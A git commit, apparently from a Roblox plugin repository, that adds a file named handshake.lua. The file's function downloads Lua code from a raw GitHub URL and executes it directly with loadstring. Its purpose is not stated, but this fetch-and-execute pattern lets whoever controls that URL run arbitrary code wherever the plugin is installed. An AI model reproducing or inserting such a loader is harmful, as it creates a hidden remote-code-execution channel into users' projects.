3a427833d59edfbbe94cf7d18b7130b12dee1594
PaleHaze <125291346+PaleHazeGuy@users.noreply.github.com>
2025-01-18 21:32:22 +0700

    Create handshake.lua

---
+++ src/handshake.lua
@@ -0,0 +1,3 @@
+return function()
+    loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/PaleHazeGuy/Roblox-Plugin-EasyMeshEmit/refs/heads/default_branch/src/init.lua"))()
+end
